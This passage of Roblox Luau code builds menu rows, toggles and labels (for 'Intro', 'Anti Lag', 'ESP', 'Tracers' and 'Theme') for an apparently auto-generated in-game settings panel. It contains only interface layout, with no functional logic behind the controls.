-- Frame_68 (Frame)
G.Frame_68 = Instance.new("Frame")
G.Frame_68.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_68.BorderSizePixel = 0
G.Frame_68.ClipsDescendants = true
G.Frame_68.LayoutOrder = 12
G.Frame_68.Size = UDim2.new(1, 0, 0, 40)
G.Frame_68.Parent = G.Page3

-- UICorner_71 (UICorner)
G.UICorner_71 = Instance.new("UICorner")
G.UICorner_71.CornerRadius = UDim.new(0, 14)
G.UICorner_71.Parent = G.Frame_68

-- UIStroke_34 (UIStroke)
G.UIStroke_34 = Instance.new("UIStroke")
G.UIStroke_34.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_34.Parent = G.Frame_68

-- TextLabel_38 (TextLabel)
G.TextLabel_38 = Instance.new("TextLabel")
G.TextLabel_38.BackgroundTransparency = 1
G.TextLabel_38.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_38.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_38.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_38.Text = "Animation Pack"
G.TextLabel_38.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_38.TextSize = 14
G.TextLabel_38.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_38.Parent = G.Frame_68

-- DropChip_3 (TextButton)
G.DropChip_3 = Instance.new("TextButton")
G.DropChip_3.Name = "DropChip"
G.DropChip_3.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
G.DropChip_3.BorderSizePixel = 0
G.DropChip_3.Position = UDim2.new(1, -130, 0, 7)
G.DropChip_3.Size = UDim2.new(0, 120, 0, 26)
G.DropChip_3.ZIndex = 12
G.DropChip_3.AutoButtonColor = false
G.DropChip_3.Text = ""
G.DropChip_3:SetAttribute("PrintedSoundWired", true)
G.DropChip_3.Parent = G.Frame_68

-- UICorner_72 (UICorner)
G.UICorner_72 = Instance.new("UICorner")
G.UICorner_72.Parent = G.DropChip_3

-- UIStroke_35 (UIStroke)
G.UIStroke_35 = Instance.new("UIStroke")
G.UIStroke_35.Color = Color3.fromRGB(55, 60, 72)
G.UIStroke_35.Transparency = 0.40000000596046448
G.UIStroke_35.Parent = G.DropChip_3

-- TextLabel_39 (TextLabel)
G.TextLabel_39 = Instance.new("TextLabel")
G.TextLabel_39.BackgroundTransparency = 1
G.TextLabel_39.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_39.Size = UDim2.new(1, -22, 1, 0)
G.TextLabel_39.ZIndex = 13
G.TextLabel_39.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_39.Text = "Hit Harder"
G.TextLabel_39.TextColor3 = Color3.fromRGB(200, 204, 216)
G.TextLabel_39.TextSize = 12
G.TextLabel_39.TextTruncate = Enum.TextTruncate.AtEnd
G.TextLabel_39.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_39.Parent = G.DropChip_3

-- TextLabel_40 (TextLabel)
G.TextLabel_40 = Instance.new("TextLabel")
G.TextLabel_40.BackgroundTransparency = 1
G.TextLabel_40.Position = UDim2.new(1, -18, 0, 0)
G.TextLabel_40.Size = UDim2.new(0, 18, 1, 0)
G.TextLabel_40.ZIndex = 13
G.TextLabel_40.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_40.Text = "v"
G.TextLabel_40.TextColor3 = Color3.fromRGB(150, 155, 168)
G.TextLabel_40.TextSize = 11
G.TextLabel_40.Parent = G.DropChip_3

-- Frame_69 (Frame)
G.Frame_69 = Instance.new("Frame")
G.Frame_69.BackgroundTransparency = 1
G.Frame_69.BorderSizePixel = 0
G.Frame_69.LayoutOrder = 45
G.Frame_69.Size = UDim2.new(1, 0, 0, 38)
G.Frame_69.Parent = G.Page3

-- TextLabel_41 (TextLabel)
G.TextLabel_41 = Instance.new("TextLabel")
G.TextLabel_41.BackgroundTransparency = 1
G.TextLabel_41.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_41.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_41.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_41.Text = "VISUAL"
G.TextLabel_41.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_41.TextSize = 15
G.TextLabel_41.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_41.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_41.Parent = G.Frame_69

-- Frame_70 (Frame)
G.Frame_70 = Instance.new("Frame")
G.Frame_70.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_70.BackgroundTransparency = 0.34999999403953552
G.Frame_70.BorderSizePixel = 0
G.Frame_70.Position = UDim2.new(0, 8, 1, -4)
G.Frame_70.Size = UDim2.new(1, -16, 0, 2)
G.Frame_70.Parent = G.Frame_69

-- Frame_71 (Frame)
G.Frame_71 = Instance.new("Frame")
G.Frame_71.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_71.BorderSizePixel = 0
G.Frame_71.ClipsDescendants = true
G.Frame_71.LayoutOrder = 46
G.Frame_71.Size = UDim2.new(1, 0, 0, 40)
G.Frame_71.Parent = G.Page3

-- UICorner_73 (UICorner)
G.UICorner_73 = Instance.new("UICorner")
G.UICorner_73.CornerRadius = UDim.new(0, 14)
G.UICorner_73.Parent = G.Frame_71

-- UIStroke_36 (UIStroke)
G.UIStroke_36 = Instance.new("UIStroke")
G.UIStroke_36.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_36.Parent = G.Frame_71

-- TextLabel_42 (TextLabel)
G.TextLabel_42 = Instance.new("TextLabel")
G.TextLabel_42.BackgroundTransparency = 1
G.TextLabel_42.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_42.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_42.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_42.Text = "Intro"
G.TextLabel_42.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_42.TextSize = 14
G.TextLabel_42.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_42.Parent = G.Frame_71

-- Frame_72 (Frame)
G.Frame_72 = Instance.new("Frame")
G.Frame_72.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_72.BorderSizePixel = 0
G.Frame_72.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_72.Size = UDim2.new(0, 46, 0, 24)
G.Frame_72.ZIndex = 3
G.Frame_72.Parent = G.Frame_71

-- UICorner_74 (UICorner)
G.UICorner_74 = Instance.new("UICorner")
G.UICorner_74.CornerRadius = UDim.new(1, 0)
G.UICorner_74.Parent = G.Frame_72

-- Frame_73 (Frame)
G.Frame_73 = Instance.new("Frame")
G.Frame_73.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_73.BorderSizePixel = 0
G.Frame_73.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_73.Size = UDim2.new(0, 18, 0, 18)
G.Frame_73.ZIndex = 4
G.Frame_73.Parent = G.Frame_72

-- UICorner_75 (UICorner)
G.UICorner_75 = Instance.new("UICorner")
G.UICorner_75.CornerRadius = UDim.new(1, 0)
G.UICorner_75.Parent = G.Frame_73

-- TextButton_20 (TextButton)
G.TextButton_20 = Instance.new("TextButton")
G.TextButton_20.BackgroundTransparency = 1
G.TextButton_20.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_20.ZIndex = 5
G.TextButton_20.AutoButtonColor = false
G.TextButton_20.Text = ""
G.TextButton_20:SetAttribute("PrintedSoundWired", true)
G.TextButton_20.Parent = G.Frame_72

-- AccentGrad_6 (UIGradient)
G.AccentGrad_6 = Instance.new("UIGradient")
G.AccentGrad_6.Name = "AccentGrad"
G.AccentGrad_6.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_6.Rotation = 28
G.AccentGrad_6.Parent = G.Frame_72

-- Frame_74 (Frame)
G.Frame_74 = Instance.new("Frame")
G.Frame_74.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_74.BorderSizePixel = 0
G.Frame_74.ClipsDescendants = true
G.Frame_74.LayoutOrder = 47
G.Frame_74.Size = UDim2.new(1, 0, 0, 40)
G.Frame_74.Parent = G.Page3

-- UICorner_76 (UICorner)
G.UICorner_76 = Instance.new("UICorner")
G.UICorner_76.CornerRadius = UDim.new(0, 14)
G.UICorner_76.Parent = G.Frame_74

-- UIStroke_37 (UIStroke)
G.UIStroke_37 = Instance.new("UIStroke")
G.UIStroke_37.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_37.Parent = G.Frame_74

-- TextLabel_43 (TextLabel)
G.TextLabel_43 = Instance.new("TextLabel")
G.TextLabel_43.BackgroundTransparency = 1
G.TextLabel_43.Position = UDim2.new(0, 10, 0, 0)
G.TextLabel_43.Size = UDim2.new(0.44999998807907104, 0, 1, 0)
G.TextLabel_43.ZIndex = 6
G.TextLabel_43.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_43.Text = "Replay Intro"
G.TextLabel_43.TextColor3 = Color3.fromRGB(200, 200, 210)
G.TextLabel_43.TextSize = 13
G.TextLabel_43.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_43.Parent = G.Frame_74

-- TextButton_21 (TextButton)
G.TextButton_21 = Instance.new("TextButton")
G.TextButton_21.BackgroundColor3 = Color3.fromRGB(140, 30, 40)
G.TextButton_21.BorderSizePixel = 0
G.TextButton_21.Position = UDim2.new(1, -110, 0.5, -13)
G.TextButton_21.Size = UDim2.new(0, 100, 0, 26)
G.TextButton_21.ZIndex = 7
G.TextButton_21.AutoButtonColor = false
G.TextButton_21.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_21.Text = "PLAY"
G.TextButton_21.TextColor3 = Color3.fromRGB(255, 230, 230)
G.TextButton_21.TextSize = 12
G.TextButton_21:SetAttribute("PrintedSoundWired", true)
G.TextButton_21.Parent = G.Frame_74

-- UICorner_77 (UICorner)
G.UICorner_77 = Instance.new("UICorner")
G.UICorner_77.Parent = G.TextButton_21

-- Frame_75 (Frame)
G.Frame_75 = Instance.new("Frame")
G.Frame_75.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_75.BorderSizePixel = 0
G.Frame_75.ClipsDescendants = true
G.Frame_75.LayoutOrder = 48
G.Frame_75.Size = UDim2.new(1, 0, 0, 40)
G.Frame_75.Parent = G.Page3

-- UICorner_78 (UICorner)
G.UICorner_78 = Instance.new("UICorner")
G.UICorner_78.CornerRadius = UDim.new(0, 14)
G.UICorner_78.Parent = G.Frame_75

-- UIStroke_38 (UIStroke)
G.UIStroke_38 = Instance.new("UIStroke")
G.UIStroke_38.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_38.Parent = G.Frame_75

-- TextLabel_44 (TextLabel)
G.TextLabel_44 = Instance.new("TextLabel")
G.TextLabel_44.BackgroundTransparency = 1
G.TextLabel_44.Position = UDim2.new(0, 10, 0, 0)
G.TextLabel_44.Size = UDim2.new(0.41999998688697815, 0, 1, 0)
G.TextLabel_44.ZIndex = 6
G.TextLabel_44.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_44.Text = "Intro Track"
G.TextLabel_44.TextColor3 = Color3.fromRGB(200, 200, 210)
G.TextLabel_44.TextSize = 13
G.TextLabel_44.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_44.Parent = G.Frame_75

-- TextButton_22 (TextButton)
G.TextButton_22 = Instance.new("TextButton")
G.TextButton_22.BackgroundColor3 = Color3.fromRGB(28, 32, 48)
G.TextButton_22.BorderSizePixel = 0
G.TextButton_22.Position = UDim2.new(1, -160, 0.5, -14)
G.TextButton_22.Size = UDim2.new(0, 150, 0, 28)
G.TextButton_22.ZIndex = 7
G.TextButton_22.AutoButtonColor = false
G.TextButton_22.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_22.Text = "Track 1 / 10"
G.TextButton_22.TextColor3 = Color3.fromRGB(180, 200, 255)
G.TextButton_22.TextSize = 12
G.TextButton_22:SetAttribute("PrintedSoundWired", true)
G.TextButton_22.Parent = G.Frame_75

-- UICorner_79 (UICorner)
G.UICorner_79 = Instance.new("UICorner")
G.UICorner_79.Parent = G.TextButton_22

-- UIStroke_39 (UIStroke)
G.UIStroke_39 = Instance.new("UIStroke")
G.UIStroke_39.Color = Color3.fromRGB(90, 130, 220)
G.UIStroke_39.Transparency = 0.34999999403953552
G.UIStroke_39.Parent = G.TextButton_22

-- Frame_76 (Frame)
G.Frame_76 = Instance.new("Frame")
G.Frame_76.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_76.BorderSizePixel = 0
G.Frame_76.ClipsDescendants = true
G.Frame_76.LayoutOrder = 49
G.Frame_76.Size = UDim2.new(1, 0, 0, 40)
G.Frame_76.Parent = G.Page3

-- UICorner_80 (UICorner)
G.UICorner_80 = Instance.new("UICorner")
G.UICorner_80.CornerRadius = UDim.new(0, 14)
G.UICorner_80.Parent = G.Frame_76

-- UIStroke_40 (UIStroke)
G.UIStroke_40 = Instance.new("UIStroke")
G.UIStroke_40.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_40.Parent = G.Frame_76

-- TextLabel_45 (TextLabel)
G.TextLabel_45 = Instance.new("TextLabel")
G.TextLabel_45.BackgroundTransparency = 1
G.TextLabel_45.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_45.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_45.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_45.Text = "Anti Lag"
G.TextLabel_45.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_45.TextSize = 14
G.TextLabel_45.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_45.Parent = G.Frame_76

-- Frame_77 (Frame)
G.Frame_77 = Instance.new("Frame")
G.Frame_77.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_77.BorderSizePixel = 0
G.Frame_77.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_77.Size = UDim2.new(0, 46, 0, 24)
G.Frame_77.ZIndex = 3
G.Frame_77.Parent = G.Frame_76

-- UICorner_81 (UICorner)
G.UICorner_81 = Instance.new("UICorner")
G.UICorner_81.CornerRadius = UDim.new(1, 0)
G.UICorner_81.Parent = G.Frame_77

-- Frame_78 (Frame)
G.Frame_78 = Instance.new("Frame")
G.Frame_78.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_78.BorderSizePixel = 0
G.Frame_78.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_78.Size = UDim2.new(0, 18, 0, 18)
G.Frame_78.ZIndex = 4
G.Frame_78.Parent = G.Frame_77

-- UICorner_82 (UICorner)
G.UICorner_82 = Instance.new("UICorner")
G.UICorner_82.CornerRadius = UDim.new(1, 0)
G.UICorner_82.Parent = G.Frame_78

-- TextButton_23 (TextButton)
G.TextButton_23 = Instance.new("TextButton")
G.TextButton_23.BackgroundTransparency = 1
G.TextButton_23.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_23.ZIndex = 5
G.TextButton_23.AutoButtonColor = false
G.TextButton_23.Text = ""
G.TextButton_23:SetAttribute("PrintedSoundWired", true)
G.TextButton_23.Parent = G.Frame_77

-- AccentGrad_7 (UIGradient)
G.AccentGrad_7 = Instance.new("UIGradient")
G.AccentGrad_7.Name = "AccentGrad"
G.AccentGrad_7.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_7.Rotation = 28
G.AccentGrad_7.Parent = G.Frame_77

-- Frame_79 (Frame)
G.Frame_79 = Instance.new("Frame")
G.Frame_79.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_79.BorderSizePixel = 0
G.Frame_79.ClipsDescendants = true
G.Frame_79.LayoutOrder = 50
G.Frame_79.Size = UDim2.new(1, 0, 0, 40)
G.Frame_79.Parent = G.Page3

-- UICorner_83 (UICorner)
G.UICorner_83 = Instance.new("UICorner")
G.UICorner_83.CornerRadius = UDim.new(0, 14)
G.UICorner_83.Parent = G.Frame_79

-- UIStroke_41 (UIStroke)
G.UIStroke_41 = Instance.new("UIStroke")
G.UIStroke_41.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_41.Parent = G.Frame_79

-- TextLabel_46 (TextLabel)
G.TextLabel_46 = Instance.new("TextLabel")
G.TextLabel_46.BackgroundTransparency = 1
G.TextLabel_46.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_46.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_46.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_46.Text = "Stretch Rez"
G.TextLabel_46.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_46.TextSize = 14
G.TextLabel_46.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_46.Parent = G.Frame_79

-- Frame_80 (Frame)
G.Frame_80 = Instance.new("Frame")
G.Frame_80.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_80.BorderSizePixel = 0
G.Frame_80.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_80.Size = UDim2.new(0, 46, 0, 24)
G.Frame_80.ZIndex = 3
G.Frame_80.Parent = G.Frame_79

-- UICorner_84 (UICorner)
G.UICorner_84 = Instance.new("UICorner")
G.UICorner_84.CornerRadius = UDim.new(1, 0)
G.UICorner_84.Parent = G.Frame_80

-- Frame_81 (Frame)
G.Frame_81 = Instance.new("Frame")
G.Frame_81.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_81.BorderSizePixel = 0
G.Frame_81.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_81.Size = UDim2.new(0, 18, 0, 18)
G.Frame_81.ZIndex = 4
G.Frame_81.Parent = G.Frame_80

-- UICorner_85 (UICorner)
G.UICorner_85 = Instance.new("UICorner")
G.UICorner_85.CornerRadius = UDim.new(1, 0)
G.UICorner_85.Parent = G.Frame_81

-- TextButton_24 (TextButton)
G.TextButton_24 = Instance.new("TextButton")
G.TextButton_24.BackgroundTransparency = 1
G.TextButton_24.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_24.ZIndex = 5
G.TextButton_24.AutoButtonColor = false
G.TextButton_24.Text = ""
G.TextButton_24:SetAttribute("PrintedSoundWired", true)
G.TextButton_24.Parent = G.Frame_80

-- AccentGrad_8 (UIGradient)
G.AccentGrad_8 = Instance.new("UIGradient")
G.AccentGrad_8.Name = "AccentGrad"
G.AccentGrad_8.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_8.Rotation = 28
G.AccentGrad_8.Parent = G.Frame_80

-- Frame_82 (Frame)
G.Frame_82 = Instance.new("Frame")
G.Frame_82.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_82.BorderSizePixel = 0
G.Frame_82.ClipsDescendants = true
G.Frame_82.LayoutOrder = 51
G.Frame_82.Size = UDim2.new(1, 0, 0, 40)
G.Frame_82.Parent = G.Page3

-- UICorner_86 (UICorner)
G.UICorner_86 = Instance.new("UICorner")
G.UICorner_86.CornerRadius = UDim.new(0, 14)
G.UICorner_86.Parent = G.Frame_82

-- UIStroke_42 (UIStroke)
G.UIStroke_42 = Instance.new("UIStroke")
G.UIStroke_42.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_42.Parent = G.Frame_82

-- TextLabel_47 (TextLabel)
G.TextLabel_47 = Instance.new("TextLabel")
G.TextLabel_47.BackgroundTransparency = 1
G.TextLabel_47.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_47.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_47.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_47.Text = "ESP"
G.TextLabel_47.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_47.TextSize = 14
G.TextLabel_47.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_47.Parent = G.Frame_82

-- Frame_83 (Frame)
G.Frame_83 = Instance.new("Frame")
G.Frame_83.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_83.BorderSizePixel = 0
G.Frame_83.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_83.Size = UDim2.new(0, 46, 0, 24)
G.Frame_83.ZIndex = 3
G.Frame_83.Parent = G.Frame_82

-- UICorner_87 (UICorner)
G.UICorner_87 = Instance.new("UICorner")
G.UICorner_87.CornerRadius = UDim.new(1, 0)
G.UICorner_87.Parent = G.Frame_83

-- Frame_84 (Frame)
G.Frame_84 = Instance.new("Frame")
G.Frame_84.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_84.BorderSizePixel = 0
G.Frame_84.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_84.Size = UDim2.new(0, 18, 0, 18)
G.Frame_84.ZIndex = 4
G.Frame_84.Parent = G.Frame_83

-- UICorner_88 (UICorner)
G.UICorner_88 = Instance.new("UICorner")
G.UICorner_88.CornerRadius = UDim.new(1, 0)
G.UICorner_88.Parent = G.Frame_84

-- TextButton_25 (TextButton)
G.TextButton_25 = Instance.new("TextButton")
G.TextButton_25.BackgroundTransparency = 1
G.TextButton_25.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_25.ZIndex = 5
G.TextButton_25.AutoButtonColor = false
G.TextButton_25.Text = ""
G.TextButton_25:SetAttribute("PrintedSoundWired", true)
G.TextButton_25.Parent = G.Frame_83

-- AccentGrad_9 (UIGradient)
G.AccentGrad_9 = Instance.new("UIGradient")
G.AccentGrad_9.Name = "AccentGrad"
G.AccentGrad_9.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_9.Rotation = 28
G.AccentGrad_9.Parent = G.Frame_83

-- Frame_85 (Frame)
G.Frame_85 = Instance.new("Frame")
G.Frame_85.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_85.BorderSizePixel = 0
G.Frame_85.ClipsDescendants = true
G.Frame_85.LayoutOrder = 52
G.Frame_85.Size = UDim2.new(1, 0, 0, 40)
G.Frame_85.Parent = G.Page3

-- UICorner_89 (UICorner)
G.UICorner_89 = Instance.new("UICorner")
G.UICorner_89.CornerRadius = UDim.new(0, 14)
G.UICorner_89.Parent = G.Frame_85

-- UIStroke_43 (UIStroke)
G.UIStroke_43 = Instance.new("UIStroke")
G.UIStroke_43.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_43.Parent = G.Frame_85

-- TextLabel_48 (TextLabel)
G.TextLabel_48 = Instance.new("TextLabel")
G.TextLabel_48.BackgroundTransparency = 1
G.TextLabel_48.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_48.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_48.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_48.Text = "Tracers"
G.TextLabel_48.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_48.TextSize = 14
G.TextLabel_48.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_48.Parent = G.Frame_85

-- Frame_86 (Frame)
G.Frame_86 = Instance.new("Frame")
G.Frame_86.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_86.BorderSizePixel = 0
G.Frame_86.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_86.Size = UDim2.new(0, 46, 0, 24)
G.Frame_86.ZIndex = 3
G.Frame_86.Parent = G.Frame_85

-- UICorner_90 (UICorner)
G.UICorner_90 = Instance.new("UICorner")
G.UICorner_90.CornerRadius = UDim.new(1, 0)
G.UICorner_90.Parent = G.Frame_86

-- Frame_87 (Frame)
G.Frame_87 = Instance.new("Frame")
G.Frame_87.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_87.BorderSizePixel = 0
G.Frame_87.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_87.Size = UDim2.new(0, 18, 0, 18)
G.Frame_87.ZIndex = 4
G.Frame_87.Parent = G.Frame_86

-- UICorner_91 (UICorner)
G.UICorner_91 = Instance.new("UICorner")
G.UICorner_91.CornerRadius = UDim.new(1, 0)
G.UICorner_91.Parent = G.Frame_87

-- TextButton_26 (TextButton)
G.TextButton_26 = Instance.new("TextButton")
G.TextButton_26.BackgroundTransparency = 1
G.TextButton_26.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_26.ZIndex = 5
G.TextButton_26.AutoButtonColor = false
G.TextButton_26.Text = ""
G.TextButton_26:SetAttribute("PrintedSoundWired", true)
G.TextButton_26.Parent = G.Frame_86

-- Frame_88 (Frame)
G.Frame_88 = Instance.new("Frame")
G.Frame_88.BackgroundTransparency = 1
G.Frame_88.BorderSizePixel = 0
G.Frame_88.LayoutOrder = 53
G.Frame_88.Size = UDim2.new(1, 0, 0, 38)
G.Frame_88.Parent = G.Page3

-- TextLabel_49 (TextLabel)
G.TextLabel_49 = Instance.new("TextLabel")
G.TextLabel_49.BackgroundTransparency = 1
G.TextLabel_49.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_49.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_49.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_49.Text = "ACCENT COLOR"
G.TextLabel_49.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_49.TextSize = 15
G.TextLabel_49.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_49.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_49.Parent = G.Frame_88

-- Frame_89 (Frame)
G.Frame_89 = Instance.new("Frame")
G.Frame_89.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_89.BackgroundTransparency = 0.34999999403953552
G.Frame_89.BorderSizePixel = 0
G.Frame_89.Position = UDim2.new(0, 8, 1, -4)
G.Frame_89.Size = UDim2.new(1, -16, 0, 2)
G.Frame_89.Parent = G.Frame_88

-- Frame_90 (Frame)
G.Frame_90 = Instance.new("Frame")
G.Frame_90.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_90.BorderSizePixel = 0
G.Frame_90.ClipsDescendants = true
G.Frame_90.LayoutOrder = 54
G.Frame_90.Size = UDim2.new(1, 0, 0, 40)
G.Frame_90.Parent = G.Page3

-- UICorner_92 (UICorner)
G.UICorner_92 = Instance.new("UICorner")
G.UICorner_92.CornerRadius = UDim.new(0, 14)
G.UICorner_92.Parent = G.Frame_90

-- UIStroke_44 (UIStroke)
G.UIStroke_44 = Instance.new("UIStroke")
G.UIStroke_44.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_44.Parent = G.Frame_90

-- TextLabel_50 (TextLabel)
G.TextLabel_50 = Instance.new("TextLabel")
G.TextLabel_50.BackgroundTransparency = 1
G.TextLabel_50.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_50.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_50.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_50.Text = "Theme"
G.TextLabel_50.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_50.TextSize = 14
G.TextLabel_50.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_50.Parent = G.Frame_90

-- DropChip_4 (TextButton)
G.DropChip_4 = Instance.new("TextButton")
G.DropChip_4.Name = "DropChip"
G.DropChip_4.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
G.DropChip_4.BorderSizePixel = 0
G.DropChip_4.Position = UDim2.new(1, -110, 0, 7)
G.DropChip_4.Size = UDim2.new(0, 100, 0, 26)
G.DropChip_4.ZIndex = 12
G.DropChip_4.AutoButtonColor = false
G.DropChip_4.Text = ""
G.DropChip_4:SetAttribute("PrintedSoundWired", true)
G.DropChip_4.Parent = G.Frame_90

-- UICorner_93 (UICorner)
G.UICorner_93 = Instance.new("UICorner")
G.UICorner_93.Parent = G.DropChip_4

